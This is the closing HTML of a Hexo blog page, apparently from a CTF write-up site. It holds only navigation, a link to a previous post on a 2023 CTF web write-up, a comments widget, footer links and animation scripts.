        <a href="/2023/04/19/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF%202023%20Web%20Writeup/" class="prev">
            <div>
                <div class="text">
                    <p class="label">Previous</p>
                    <h3 class="title">红明谷CTF 2023 Web writedup</>
                </div>
            </div>
        </a>
        
    </div>

    
        
        
        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
        
    
</article>

        <footer>
    <div class="inner">
        <div class="links">
            
            <div class="group">
                <h2 class="title">Blog</h2>
                
                <a href="/" class="item">Blog</a>
                
                <a href="/archives" class="item">Archives</a>
                
                <a href="/tags" class="item">Tags</a>
                
                <a href="/categories" class="item">Categories</a>
                
                <a href="/search" class="item">Search</a>
                
                <a href="/friends" class="item">Friends</a>
                
                <a href="/about" class="item">About</a>
                
                <a href="/atom.xml" class="item">RSS</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Projects</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Me</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
                
                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
                
                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
                
                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
                
                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
                
                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
                
            </div>
            
        </div>
        <span>&copy; 2025 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
        
        
            <br>
            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
                <label>
                    <input type="radio" value="light">
                    <span>Light</span>
                </label>
                <label>
                    <input type="radio" value="dark">
                    <span>Dark</span>
                </label>
                <label>
                    <input type="radio" value="auto">
                    <span>Auto</span>
                </label>
            </div>
        
    </div>
</footer>


        
<script src="/js/main.js"></script>

        
        
        

        
        <script src="https://unpkg.com/scrollreveal"></script>
		
        <script>
            window.addEventListener('load', () => {
                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
                ScrollReveal().reveal('.post-list-item .cover-img img')
                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
            })
        </script>
        
    </body>
</html>